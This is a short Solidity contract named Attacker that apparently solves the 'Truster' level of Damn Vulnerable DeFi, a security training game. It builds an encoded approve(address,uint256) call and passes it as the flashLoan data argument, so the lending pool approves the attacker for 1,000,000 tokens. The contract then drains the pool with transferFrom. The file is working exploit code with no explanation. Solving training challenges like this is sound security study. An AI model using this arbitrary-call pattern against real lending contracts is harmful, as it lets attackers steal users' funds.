//SPDX-License-Identifier:MIT

pragma solidity ^0.8.16;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract Attacker {
    TrusterLenderPool public pool;
    DamnValuableToken public token;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token) {
        pool = _pool;
        token = _token;
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            1000000 ether
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, 1000000 ether);
    }
}
